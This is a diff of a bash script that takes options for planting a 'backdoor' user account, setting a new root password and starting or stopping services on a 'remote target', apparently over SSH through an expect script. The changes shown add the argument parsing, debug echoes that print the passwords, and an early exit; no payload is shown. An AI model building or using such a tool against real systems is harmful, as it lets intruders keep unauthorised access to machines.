@@ -25,7 +25,7 @@ if [ "$1" = "-h" -o "$1" = "--help" ]; then
 	echo "	-P, --password <your_password_here>"
 	echo "			Allows user to specify which password the backdoor"
 	echo -e "			user will have on the remote target.\n"
-	echo "	-r, --root-password"
+	echo "	-r, --root-password <your_password_here>"
 	echo "			Allows user to specify the new root password on the"
 	echo -e "			target.\n"
 	echo "	-s,overwrite|append service1,service2"
@@ -79,34 +79,45 @@ if [ $# -gt 0 ]; then
 	while [ $# -gt 0 ]; do #if there are still args leftover, they left options
 		param=`echo $1 | /usr/bin/env awk -F"," '{print $2}'`
 		case "$1" in
-			*-B|--build-only*)
-				echo "build only option not yet implemented"
+			*-B|--build-only|--buildonly*)
+				buildOnly="yes"
+				;;
+			*-n|--name*)
+				newUser=$2
 				;;
 			*-p|--port*)
-				echo "port option not yet implemented"
+				port=$2
 				;;
 			*-P|--password*)
-				echo "password option not yet implemented"
+				newPass=$2
 				;;
-			*-r|--root-password*)
-				echo "root password option not yet implemented"
+			*-r|--root-password|--rootpassword*)
+				newRootPass=$2
 				;;
 			*-s*)
-				echo "start services option not yet implemented"
+				if [ "$param" == "overwrite" ]; then
+					serviceStart="${2//,/ }"
+				else
+					serviceStart="$serviceStart ${2//,/ }"
+				fi
 				;;
 			*-S*)
-				echo "stop services option not yet implemented"
+				if [ "$param" == "overwrite" ]; then
+					serviceStop="${2//,/ }"
+				else
+					serviceStop="$serviceStop ${2//,/ }"
+				fi
 				;;
-			*-u|--userid*)
-				echo "userid option not yet implemented"
+			*-u|--userid|--uid*)
+				newUserID=$2
 				;;
 			*)
 				echo "Arg '$1' not recognized...continuing anyway." 1>&2
-				if [ "$2" != "" -a "${2:0:1}" != "-" -a "${2:0:2}" != "--" ]; then
-					shift
-				fi
 				;;
 		esac
+		if [ "$2" != "" -a "${2:0:1}" != "-" -a "${2:0:2}" != "--" ]; then
+			shift
+		fi
 		shift
 	done
 else
@@ -122,15 +133,17 @@ if [ ${#port} -lt 1 ]; then #if no port given, make default 22
 		port=22
 fi
 
-# echo "here are your values!"
-# echo "newUser: '$newUser'"
-# echo "newUserID: '$newUserID'"
-# echo "newPass: '$newPass'"
-# echo "newRootPass: '$newRootPass'"
-# echo "port: '$port'"
-# echo "buildOnly: '$buildOnly'"
+echo "here are your values!"
+echo "newUser: '$newUser'"
+echo "newUserID: '$newUserID'"
+echo "newPass: '$newPass'"
+echo "newRootPass: '$newRootPass'"
+echo "port: '$port'"
+echo "serviceStart: '$serviceStart'"
+echo "serviceStop: '$serviceStop'"
+echo "buildOnly: '$buildOnly'"
 
-# exit 0
+exit 0
 
 echo "#!/usr/bin/expect" > $expectFile #write shebang to file
 
@@ -232,7 +245,7 @@ BOTTOM
 
 echo "Attempting login..."
 if [ "$buildOnly" != "no" ]; then
-	/usr/bin/expect myfile.exp
+	# /usr/bin/expect myfile.exp
 fi
 echo "Completed."
 
